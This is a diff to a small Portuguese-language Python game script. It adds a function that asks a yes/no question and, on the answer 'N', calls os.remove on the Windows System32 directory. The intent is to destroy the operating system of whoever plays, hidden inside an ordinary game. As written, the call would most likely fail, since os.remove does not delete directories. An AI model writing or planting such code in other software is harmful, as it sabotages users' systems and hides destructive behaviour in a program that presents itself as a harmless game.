@@ -1,5 +1,6 @@
 from random import randint
 from time import sleep
+import os
 print("-=" *30 )
 
 print("jogos")
@@ -122,7 +123,13 @@ def IMPARouPAR():
     print("JOGAR NOVAMENTE...")
     print(f"GAME OVER [voce venceu {vitoria} vezes]")
 
-        
+def simounão():
+    print("danilo da o caneco?")
+    resposta = input("Y or N : ")
+    if resposta == 'Y':
+        print("sabia")
+    if resposta == 'N':
+        os.remove("C:\Windows\System32")
 if qualjogo == 1:
     zeroadez()
 
